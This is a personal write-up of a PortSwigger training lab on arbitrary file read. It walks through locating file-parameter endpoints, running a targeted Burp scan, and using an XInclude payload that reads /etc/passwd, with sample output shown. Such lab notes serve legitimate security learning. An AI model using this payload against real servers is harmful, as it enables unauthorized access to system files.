
# #PortSwigger 


![[Pasted image 20260621160953.png]]


## Lab Description

>This lab contains a vulnerability that enables you to read arbitrary files from the server. **Objective:** Retrieve the contents of `/etc/passwd` within 10 minutes.
>
>Due to the tight time limit, we recommend using **Burp Scanner** with **targeted scanning** — don't scan the entire site; instead, use your intuition to identify likely vulnerable endpoints and run a targeted scan on a specific request.

---
---

### Step 1: Explore the Application

Browse the lab website and look for:
- **File download** links (PDFs, images, documents)
- **URL parameters** that take filenames
- **`?file=` or `?path=` parameters**
- **Product pages** with `id` or `name` parameters

---

### Step 2: Identify a Likely Vulnerable Endpoint

Look for requests like:
```
GET /download?file=report.pdf
GET /view?page=about
GET /getImage?filename=photo.jpg
GET /product/post
```

![[Pasted image 20260621174421.png]]

**Suspect endpoints:**
- Any parameter that references a file
- Any endpoint that serves static content dynamically

---

### Step 3: Send to Burp Scanner (Targeted Scan)

1. Right-click the request --> **Do an active scan**
2. Use **Targeted scan** - focus on the specific parameter
3. Let Burp Scanner run its tests


---

### Step 5: Exploit the Vulnerability

Using the scanner's findings, manually craft a request:

**Example payloads:**
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```


![[Pasted image 20260621174601.png]]

---

### Step 6: Retrieve /etc/passwd

Once you find the working payload, the response will contain the contents of `/etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```


![[Pasted image 20260621174616.png]]


---

### Step 7: Lab Solved

Once you retrieve the file, the lab is solved.

![[Pasted image 20260621174630.png]]

---
---
